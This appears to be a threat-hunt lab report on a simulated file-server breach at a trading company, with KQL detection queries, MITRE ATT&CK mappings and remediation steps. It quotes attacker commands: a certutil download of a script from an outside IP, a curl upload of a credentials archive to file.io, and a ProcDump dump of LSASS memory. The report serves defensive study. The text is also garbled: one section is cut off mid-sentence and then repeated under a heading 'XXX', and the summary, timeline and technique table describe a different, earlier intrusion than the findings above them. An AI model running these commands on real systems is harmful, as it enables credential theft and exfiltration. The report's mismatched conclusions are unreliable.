# Threat Hunt Report: File Server Breach and Multi-Stage Exfiltration

## Executive Summary

Azuki Import & Export Trading Co. experienced continued malicious activity approximately 72 hours after the initial compromise that occurred between November 18-19, 2025. The attacker returned on November 21, 2025, conducted lateral movement to the organization's file server, and executed a sophisticated data exfiltration operation. The investigation revealed behavior consistent with ADE SPIDER (APT-SL44, SilentLynx), involving lateral movement using compromised credentials, extensive reconnaissance, credential theft via LSASS memory dumping, data staging and compression, exfiltration to cloud storage, establishment of persistence mechanisms, and anti-forensics activities. This investigation reconstructs the complete attack timeline and documents the threat actor's tactics, techniques, and procedures.

## Background
- **Incident Date:** November 21-22, 2025  
- **Compromised Host:** azuki-fileserver01  
- **Threat Actor:** ADE SPIDER (APT-SL44, SilentLynx)  
- **Motivation:** Financial  
- **Target Profile:** Logistics and import/export companies, East Asia region  
- **Typical Dwell Time:** 21-45 days  
- **Attack Sophistication:** Moderate with preference for low-footprint techniques

---

## Investigation Steps

### 1. Initial Access: Return Connection Source

The attacker returned approximately 72 hours after the initial compromise using a different IP address to evade detection. The analysis revealed that the IP address 159.26.106.98 was the attacker's return connection. Since it's distinct from the original compromise IP, it's likely that the attacker attempted to utilize infrastructure rotation as an evasion technique.

**Query used to locate events:**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-24))
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project TimeGenerated, RemoteIP, AccountName, LogonType
| order by TimeGenerated asc

```
<img width="1923" height="637" alt="CH_Q1" src="https://github.com/user-attachments/assets/852e4110-1588-46ad-b8a4-19908d3ee061" />

---

### 2. Lateral Movement: Compromised Device & Compromised Account

Searched for evidence of lateral movement and discovered multiple RDP connections to the IP address 10.1.0.108, which was then correlated with logon events to identify the device name. The attacker used Remote Desktop (mstsc.exe) from the compromised system (azuki-sl) to connect to IP address 10.1.0.108. Further investigation revealed that the attacker performed lateral movement from the compromised workstation to the organization's primary file server (i.e., azuki-fileserver01), positioning themselves to access sensitive business data. In addition, the investigation also revealed that the attacker moved laterally to the file server using the fileadmin account. Compromising an administrative account with file management privileges also provides the attacker with elevated access to file shares and sensitive data.

**Queries used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName == "mstsc.exe"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| project TimeGenerated, ProcessCommandLine, DeviceName
| order by TimeGenerated asc

```
<img width="1811" height="416" alt="CH_Q2A" src="https://github.com/user-attachments/assets/809b1b6d-290a-469d-bd4e-36bc5d145b24" />

---

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where RemoteIP == "10.1.0.108"
| project TimeGenerated, DeviceName, RemoteIP, AccountName
| order by TimeGenerated asc

```
<img width="1786" height="929" alt="CH_Q2B" src="https://github.com/user-attachments/assets/ea68537c-539e-4168-9efa-dc8af73b68fb" />

---

### 3. Discovery: Share Enumeration

Searched for evidence of network share enumeration and discovered that the attacker executed the net share command to enumerate local network shares on the compromised file server. This command reveals all shared folders on the local system, allowing the attacker to identify sensitive data repositories for collection.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has "net" and ProcessCommandLine has "share"
| project TimeGenerated, ProcessCommandLine, FileName, AccountName
| order by TimeGenerated asc

```
<img width="2069" height="273" alt="CH_Q4A" src="https://github.com/user-attachments/assets/308e0369-64bf-49af-8cb7-96e69f9722d7" />

---

### 4. Discovery: Remote Share Enumeration

Searched for evidence of remote network share enumeration and discovered that the attacker utilized the command "net view \\10.1.0.188" to enumerate shares on a remote system (i.e., IP 10.1.0.188), expanding the attacker's knowledge of available data repositories across the network.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "net.exe"
| where ProcessCommandLine has "\\"
| project TimeGenerated, ProcessCommandLine, FileName
| order by TimeGenerated asc

```
<img width="1393" height="265" alt="CH_Q5" src="https://github.com/user-attachments/assets/6efb33b4-19f0-404d-86b9-71907c11c84b" />

---

### 5. Discovery: Privilege Enumeration 

Searched for evidence of privilege enumeration and discovered that the attacker utilized the command "whoami.exe" /all" which provides comprehensive details about the security context of the compromised system including user name, security identifier (SID), group memberships, and privileges, enabling the attacker to understand their current access level.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "whoami.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1677" height="331" alt="CH_Q6" src="https://github.com/user-attachments/assets/e7882ca0-982d-4ad6-b458-2280585d3d61" />

---

### 6. Discovery: Network Configuration 

Searched for evidence of network configuration enumeration and discovered that the attacker utilized the command ""ipconfig.exe" /all" to better understand the environment topology. This command reveals comprehensive network details including DNS servers, DHCP configuration, domain membership, MAC addresses, and all network adapters, providing the attacker with a complete picture of the network environment.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "ipconfig.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1720" height="275" alt="CH_Q7" src="https://github.com/user-attachments/assets/d58c65c0-8a78-4232-9407-3c0dc237fc69" />

---

### 7. Defense Evasion: Directory Hiding & Staging Directory Path

Searched for evidence of the modification of file system attributes since this is a technique employed by attackers to hide directories. This analysis revealed that the attacker modified file attributes to hide their staging directory utilizing the command ""attrib.exe" +h +s C:\Windows\Logs\CBS" and made it appear as a protected Windows system component. This command sets both hidden (+h) and system (+s) attributes on the directory, causing it to blend in with legitimate Windows system folders. The CBS (Component-Based Servicing) folder name was chosen to appear as a legitimate Windows log directory. In addition, the staging directory path was C:\Windows\Logs\CBS. This staging directory was created in a location designed to masquerade as legitimate Windows system logs, making it less likely to be discovered during casual system inspection.
 
**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "attrib.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1703" height="286" alt="CH_Q8" src="https://github.com/user-attachments/assets/e2586234-e6de-4413-930f-e990e891da3b" />

---

### 8. Defense Evasion: Script Download 

Searched for evidence of malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine has_any ("certutil", "bitsadmin", "urlcache")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2298" height="420" alt="CH_Q9" src="https://github.com/user-attachments/assets/a336c803-3d5e-4fcd-a379-b70201e04c4e" />

---

### 9. Collection: Credential File Discovery

Searched for evidence of credential file creation and discovered that the attacker created a credential file (i.e., IT-Admin-Passwords.csv)in the staging directory. This file contains exported credentials (e.g., IT administrator passwords), likely harvested from password managers, browser storage, or credential stores. The descriptive filename indicates the attacker organized their stolen data for easy identification during exfiltration.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FolderPath has "CBS"
| where FileName endswith ".csv"
| project TimeGenerated, FileName, FolderPath, ActionType

```
<img width="2160" height="275" alt="CH_Q11" src="https://github.com/user-attachments/assets/5522277f-9363-41b3-a2a5-9e97016cc7ff" />

---

### 10. Collection: Recursive Copy  

Searched for evidence of bulk data collection activities and discovered that the attacker used xcopy to recursively copy entire file share directories to the staging location using the following command: xcopy C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y. This command specifically targeted the IT-Admin share containing credential files and administrative documentation.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has_any ("robocopy", "xcopy")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2175" height="669" alt="CH_Q12" src="https://github.com/user-attachments/assets/19c0aeca-93d0-44df-afde-b0b72eb9e728" />

---
### 11. Collection: Compression

Searched for evidence of archive creation and discovered that the attacker used tar (i.e., a cross-platform compression tool not native to legacy Windows environments) to compress the staged credentials. The attacker utilized the following command to compress the IT-Admin credentials folder into a portable .tar.gz format suitable for exfiltration: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has_any ("7z", "tar", "rar")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2284" height="884" alt="CH_Q13" src="https://github.com/user-attachments/assets/275f8aa9-8da4-450c-bc71-e41f052f2c22" />

---

### 12. Credential Access: Renamed Tool

Searched for evidence of executable file creation events in attacker-controlled directories in order to identify renamed credential dumping tools since this is a common OPSEC practice used for evading signature-based detection. This analysis revealed that the attacker renamed a credential dumping tool to a short, inconspicuous name (i.e., "pd.exe") that could blend in with program data or system processes.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName endswith ".exe"
| where FolderPath has "Windows\\Logs\\CBS"
| where ActionType == "FileCreated"
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2203" height="283" alt="CH_Q14" src="https://github.com/user-attachments/assets/65c498e1-7125-4ff3-a2f7-ce552eab5d3f" />

---

### 13. Credential Access: Memory Dump 

Searched for evidence of credential dumping activities and discovered that ProcDump (renamed to pd.exe) was used to dump LSASS process memory using the command: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp. LSASS memory contains credentials for logged-on users, enabling the attacker to extract plaintext and hashed passwords for privilege escalation and lateral movement.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName == "pd.exe" or ProcessCommandLine has "pd.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1940" height="293" alt="CH_Q15" src="https://github.com/user-attachments/assets/f4dc6421-1080-4885-99dc-04814ddbb47a" />

---

### 14. Exfiltration: Upload & Cloud Service

Searched for evidence of data exfiltration and discovered that the attacker used curl with form-based transfer syntax (i.e., -F: Form-based file upload; multipart/form-data HTTP POST) to upload the compressed credential archive to a temporary file hosting service (i.e., file.io) using the command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. File.io is a temporary file hosting service that requires no authentication, automatically deletes files after download, leaves minimal traces for forensic investigation, blends with legitimate file sharing traffic, and provides anonymous upload capability.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName == "curl.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1776" height="595" alt="CH_Q16" src="https://github.com/user-attachments/assets/6740b98d-1933-40ec-8173-485f0e3991f5" />

---

### 15. Persistence: Registry Value Name

Searched for evidence of persistence and discovered...

target systems specified in remote access commands and discovered that the attacker targeted IP address 10.1.0.188 for lateral movement. Since lateral movement targets are selected based on their access to sensitive data or network privileges, identifying these targets can reveal attacker objectives. In addition, the attacker used mstsc.exe (Microsoft Terminal Services Client - the built-in Windows Remote Desktop client) for lateral movement. This Living Off The Land technique allows malicious RDP connections to blend seamlessly with legitimate IT administrative activity.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FileName in ("cmdkey.exe", "mstsc.exe")
| project TimeGenerated, FileName, ProcessCommandLine
| sort by TimeGenerated desc

```
<img width="2140" height="474" alt="POE_QR19" src="https://github.com/user-attachments/assets/a579c51e-e75b-478e-b81e-b29b879a0fbf" />

---

### 15. XXX

Searched for target systems specified in remote access commands and discovered that the attacker targeted IP address 10.1.0.188 for lateral movement. Since lateral movement targets are selected based on their access to sensitive data or network privileges, identifying these targets can reveal attacker objectives. In addition, the attacker used mstsc.exe (Microsoft Terminal Services Client - the built-in Windows Remote Desktop client) for lateral movement. This Living Off The Land technique allows malicious RDP connections to blend seamlessly with legitimate IT administrative activity.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FileName in ("cmdkey.exe", "mstsc.exe")
| project TimeGenerated, FileName, ProcessCommandLine
| sort by TimeGenerated desc

```
<img width="2140" height="474" alt="POE_QR19" src="https://github.com/user-attachments/assets/a579c51e-e75b-478e-b81e-b29b879a0fbf" />

---

## Summary

The investigation revealed a sophisticated multi-stage attack against Azuki Import & Export Trading Co. orchestrated by the ADE SPIDER threat actor group. The attack began with external RDP access using compromised credentials for user account kenji.sato from IP address 88.97.178.12. Following initial access, the attacker conducted network reconnaissance using arp commands to map the environment.

The threat actor demonstrated advanced defense evasion capabilities by creating a hidden staging directory (C:\ProgramData\WindowsCache), adding three file extension exclusions (.bat, .ps1, .exe) to Windows Defender, and excluding the user's temporary folder from security scanning. Malware was downloaded using the legitimate certutil.exe utility, a classic Living Off The Land technique that evades detection.

Persistence was established through multiple mechanisms including a scheduled task named "Windows Update Check" configured to execute malicious payloads daily with SYSTEM privileges, and creation of a backdoor administrator account named "support". The attacker deployed Mimikatz (renamed to mm.exe) to harvest credentials from LSASS memory using the sekurlsa::logonpasswords module.

Command and control communications were established to infrastructure at 78.141.196.6 over port 443 (HTTPS), enabling the attacker to maintain control while blending with legitimate encrypted traffic. Stolen data was compressed into export-data.zip and exfiltrated via Discord webhooks using curl.exe, leveraging a trusted cloud service to bypass network security controls.

The attack culminated in lateral movement to the file server (10.1.0.188) using stolen fileadmin credentials and the built-in mstsc.exe tool. Prior to disconnecting, the attacker systematically cleared Security, System, and Application event logs using wevtutil.exe to destroy forensic evidence. The attack automation was facilitated by a PowerShell script (wupdate.ps1) disguised as a Windows update utility.

The sophistication of this attack, including the use of multiple persistence mechanisms, extensive anti-forensics, and preference for native Windows tools, is consistent with ADE SPIDER's known tactics, techniques, and procedures. The targeting of a logistics company in East Asia aligns with the group's established operational patterns and financial motivation.

---

## Timeline

| Time (UTC) | Step | Action Observed | Key Evidence |
|:------------:|:------:|:----------------:|:--------------:|
| 2025-11-18 22:44:11 | 1 | Initial Access via RDP | External connection from 88.97.178.12 using kenji.sato credentials |
| 2025-11-18 17:23:53 | 2 | Network Reconnaissance | arp -a command executed to enumerate local network |
| 2025-11-19 19:05:33 | 3 | Defense Evasion - Staging | C:\ProgramData\WindowsCache directory created and hidden |
| 2025-11-19 18:49:27 | 4 | Defense Evasion - Exclusions | Three file extensions (.bat, .ps1, .exe) excluded from Defender |
| 2025-11-19 18:49:27 | 5 | Defense Evasion - Path Exclusion | C:\Users\KENJI~1.SAT\AppData\Local\Temp excluded from scanning |
| 2025-11-19 18:49:48 | 6 | Script Deployment | wupdate.ps1 PowerShell script created in Temp directory |
| 2025-11-19 19:06:58 | 7 | Malware Download | certutil.exe used to download svchost.exe from 78.141.196.6:8080 |
| 2025-11-19 19:07:21 | 8 | Credential Tool Download | certutil.exe used to download mm.exe (Mimikatz) |
| 2025-11-19 19:07:46 | 9 | Persistence - Scheduled Task | "Windows Update Check" task created for daily execution at 02:00 |
| 2025-11-19 19:08:26 | 10 | Credential Dumping | mm.exe executed with sekurlsa::logonpasswords module |
| 2025-11-19 19:09:21 | 11 | Data Exfiltration | export-data.zip uploaded to Discord webhook via curl.exe |
| 2025-11-19 19:09:48 | 12 | Backdoor Account Creation | Local administrator account "support" created |
| 2025-11-19 19:10:37 | 13 | Credential Storage for Lateral Movement | cmdkey.exe used to store fileadmin credentials for 10.1.0.188 |
| 2025-11-19 19:10:41 | 14 | Lateral Movement | mstsc.exe launched to connect to file server (10.1.0.188) |
| 2025-11-19 19:11:04 | 15 | C2 Communication | Malicious svchost.exe contacted 78.141.196.6:443 |
| 2025-11-19 19:11:39 | 16 | Anti-Forensics - Security Log | wevtutil.exe used to clear Security event log |
| 2025-11-19 19:11:43 | 17 | Anti-Forensics - System Log | wevtutil.exe used to clear System event log |
| 2025-11-19 19:11:46 | 18 | Anti-Forensics - Application Log | wevtutil.exe used to clear Application event log |

---

**Note:** Network reconnaissance was observed at 17:23:53 on November 18, prior to the external RDP connection at 22:44:11. This suggests potential earlier compromise through an unidentified vector. The timeline reflects logical attack progression rather than strict chronological order.

---

## Relevant MITRE ATT&CK TTPs

| TTP ID | TTP Name | Description | Detection Relevance |
|:--------:|:----------:|:-------------:|:---------------------:|
| T1078.003 | Valid Accounts: Local Accounts | Compromised kenji.sato account used for initial RDP access | Identifies authentication with compromised credentials from external sources |
| T1021.001 | Remote Services: Remote Desktop Protocol | External RDP connection from 88.97.178.12 established initial foothold | Detects unauthorized external RDP connections |
| T1018 | Remote System Discovery | arp -a command executed to enumerate network neighbors | Indicates reconnaissance activity prior to lateral movement |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | attrib +h +s used to hide C:\ProgramData\WindowsCache staging directory | Identifies attempts to conceal malicious artifacts |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Windows Defender exclusions added for .bat, .ps1, .exe and Temp folder | Detects security control modifications |
| T1105 | Ingress Tool Transfer | certutil.exe abused to download svchost.exe and mm.exe from 78.141.196.6 | Identifies LOLBin abuse for malware downloads |
| T1053.005 | Scheduled Task/Job: Scheduled Task | "Windows Update Check" scheduled task created for persistence | Detects automated persistence mechanisms |
| T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz sekurlsa::logonpasswords used to extract credentials | Identifies credential theft from LSASS |
| T1560.001 | Archive Collected Data: Archive via Utility | Data compressed into export-data.zip for exfiltration | Detects data staging for exfiltration |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Discord webhook used to exfiltrate compressed archive | Identifies data exfiltration to cloud services |
| T1136.001 | Create Account: Local Account | Local administrator account "support" created as backdoor | Detects unauthorized account creation |
| T1550.001 | Use Alternate Authentication Material: Application Access Token | cmdkey.exe used to store credentials for lateral movement | Identifies credential storage for remote access |
| T1021.001 | Remote Services: Remote Desktop Protocol | mstsc.exe used to move laterally to file server 10.1.0.188 | Detects internal RDP connections for lateral movement |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 communications over HTTPS (port 443) to 78.141.196.6 | Indicates C2 channel over encrypted web traffic |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | wevtutil.exe used to systematically clear Security, System, and Application logs | Detects anti-forensic log tampering |
| T1059.001 | Command and Scripting Interpreter: PowerShell | wupdate.ps1 PowerShell script used to automate attack chain | Identifies malicious PowerShell script execution |

---

This table organizes the MITRE ATT&CK techniques observed during the investigation. The detection methods identified both the attack techniques and enabled confirmation of the threat actor's sophistication through multiple layers of obfuscation, persistence, and anti-forensics.

---

## Response Taken

| MITRE Mitigation ID | Name | Action Taken | Description | Relevance |
|:---------------------:|:------:|:--------------:|:-------------:|:-----------:|
| M1032 | Multi-factor Authentication | Enforced MFA | Enforced MFA for all RDP connections and privileged account access. Implemented conditional access policies requiring MFA for external connections. | Prevents initial access via compromised passwords. |
| M1027 | Password Reset | Account Credential Reset | Reset credentials for kenji.sato account and implemented mandatory password change with MFA enrollment. | Mitigates unauthorized access risks by invalidating potentially compromised credentials. |
| M1026 | Privileged Account Management | Backdoor Account Removal | Removed backdoor "support" account and audited all local administrator group memberships. | Prevents unauthorized access attempts via attacker-created accounts. |
| M1054 | Software Configuration | Defender Exclusion Restrictions | Implemented Group Policy to prevent standard users from modifying Windows Defender exclusions. Removed all unauthorized exclusions including .bat, .ps1, .exe extensions and Temp folder path. | Prevents attackers from evading detection by modifying security tool configurations. |
| M1038 | Execution Prevention | Constrained Language Mode | Implemented PowerShell Constrained Language Mode on workstations to restrict unapproved script execution and prevent -ExecutionPolicy Bypass. | Prevents unauthorized PowerShell scripts from executing. |
| M1047 | Audit | Enhanced PowerShell Logging | Enabled PowerShell script block logging and module logging across all endpoints to capture full command execution context. | Enables early detection of future malicious PowerShell activity and provides forensic evidence. |
| M1042 | Disable or Remove Feature or Program | Restrict Certutil | Restricted certutil.exe execution through application control policies, allowing usage only by authorized administrators. | Prevents abuse of legitimate system utilities for malware downloads. |
| M1031 | Network Intrusion Prevention | Network Egress Filtering | Blocked outbound connections to 78.141.196.6 and Discord webhook endpoints at network perimeter. Implemented egress filtering for testing/debugging services. | Prevents data exfiltration to known malicious infrastructure and commonly abused cloud services. |
| M1037 | Filter Network Traffic | RDP Access Restrictions | Restricted RDP access through jump servers with MFA. Implemented network segmentation to isolate file servers from user workstations. | Limits lateral movement opportunities by enforcing network access controls. |
| M1030 | Network Segmentation | VLAN Segmentation | Deployed VLAN segmentation between user workstations, servers, and administrative systems with firewall rules enforcing least privilege access. | Compartmentalizes network to restrict lateral movement paths. |
| M1018 | User Account Management | Account Lockout Policy | Implemented stricter account lockout thresholds and account monitoring for suspicious activity detection. | Adds security layers to prevent unauthorized access attempts. |
| M1028 | Operating System Configuration | Application Control (WDAC) | Deployed Windows Defender Application Control policies to prevent execution of unsigned binaries in staging directories. | Restricts execution of unauthorized applications through code integrity policies. |
| M1022 | Restrict File and Directory Permissions | System Directory Hardening | Removed write permissions for standard users to ProgramData directory and implemented file integrity monitoring for system directories. | Prevents unauthorized file creation in system directories and detects suspicious modifications. |
| M1017 | User Training | Security Awareness Training | Conducted mandatory security awareness training for affected user and IT cohort, focusing on credential protection and recognizing suspicious RDP access. | Reduces likelihood of future credential compromise through social engineering. |

---

The following response actions were recommended: (1) Enforcing MFA for all RDP connections and external access; (2) Resetting credentials for compromised kenji.sato account with mandatory password change; (3) Removing backdoor "support" account and auditing administrator group memberships; (4) Implementing Group Policy restrictions on Windows Defender exclusion modifications and removing unauthorized exclusions; (5) Deploying PowerShell Constrained Language Mode to prevent execution policy bypass; (6) Enabling enhanced PowerShell script block and module logging; (7) Restricting certutil.exe execution through application control policies; (8) Blocking outbound connections to 78.141.196.6 and Discord webhook endpoints; (9) Implementing RDP access restrictions through jump servers and VLAN segmentation; (10) Deploying Windows Defender Application Control policies; (11) Hardening system directory permissions and implementing file integrity monitoring; (12) Conducting mandatory security awareness training focusing on credential protection and RDP security.

---
